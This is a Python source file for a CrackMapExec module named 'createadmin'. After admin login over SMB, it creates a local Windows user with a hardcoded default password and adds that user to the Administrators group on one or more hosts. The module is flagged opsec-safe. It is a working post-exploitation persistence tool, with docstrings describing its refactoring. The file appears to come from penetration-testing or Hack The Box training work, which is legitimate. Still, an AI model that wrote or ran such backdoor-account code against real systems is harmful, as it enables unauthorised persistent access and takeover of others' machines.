#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
In this version of the script, the user creation and addition to the administrators group have been split into two separate commands. 

The script first checks if the user already exists before attempting to create it. If the user creation command fails, an error message is displayed, and the script stops execution. 

If the addition to the administrators group fails, an error message is also displayed. On successful execution of each command, a success message is logged.

Additionally, the context.log.highlight(p) calls have been replaced with context.log.success() for successful operations and context.log.error() for errors, providing clearer feedback on outcomes.

The script also decodes the output from the command execution to ensure it is properly formatted for string operations.

Further updates:
I've replaced the .format() method calls with f-strings, making the code more concise and easier to read. 

I've simplified the assignment of self.user and self.password using the get() method, which provides a default value if the specified key is not found in the dictionary. This approach helps to reduce the amount of code and improves readability.

The options method checks for invalid (empty) values for 'USER' and 'PASS' options, logging an error and exiting if any are found.

'''

class CMEModule:
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Choose a username for the administrator account. Default: plaintext
        PASS    Choose a password for the administrator. Default: HackTheBoxCME1337!
        '''

        self.user = module_options.get('USER', 'plaintext')
        if not self.user:
            context.log.error('Invalid value for USER option!')
            exit(1)

        self.password = module_options.get('PASS', 'HackTheBoxCME1337!')
        if not self.password:
            context.log.error('Invalid value for PASS option!')
            exit(1)

    def on_admin_login(self, context, connection):
        context.log.info(f'Creating user with the following values: USER {self.user} and PASS {self.password}')
        
        command_check_user = f'net user {self.user}' # creates a string containing the net user cmd with the value of self.user into the string.
        p = connection.execute(command_check_user, True)
        output = p.decode('utf-8').lower() # decodes the output from the command execution from bytes into UTF-8 encoding
        if 'more' in output or 'local group memberships' in output: #checks if these strings are in the commands output (see comment below for why)
            context.log.error(f'User {self.user} already exists!')
            return
        
        # Create user
        command_create_user = f'net user {self.user} "{self.password}" /add'
        p = connection.execute(command_create_user, True)
        output = p.decode('utf-8').lower()
        if 'completed successfully' not in output:
            context.log.error(f'Failed to create user. Error: {output}')
            return
        context.log.success(f'User {self.user} created successfully')
        
        # Add user to administrators group
        command_add_admin = f'net localgroup administrators {self.user} /add'
        p = connection.execute(command_add_admin, True)
        output = p.decode('utf-8').lower()
        if 'completed successfully' not in output:
            context.log.error(f'Failed to add user to administrators group. Error: {output}')
            return
        context.log.success(f'User {self.user} added to administrators group successfully')


        '''
        More infor on the command_check_user block
        The command net user {username} will list the properties of the user if the user exists. If the user is part of any groups, the output will include a section that lists "Local group memberships" followed by the groups the user belongs to.

        The term "more" is included in the output when the command has more information than can be displayed in the command prompt window at one time. This is a common feature of command-line interfaces where output pagination is required, and the more command or keyword is involved in displaying the output one page at a time.

        So in the context of this script, if the output contains "more" or "local group memberships", it indicates that the user exists and has a list of properties and group memberships, which are being displayed.
        '''
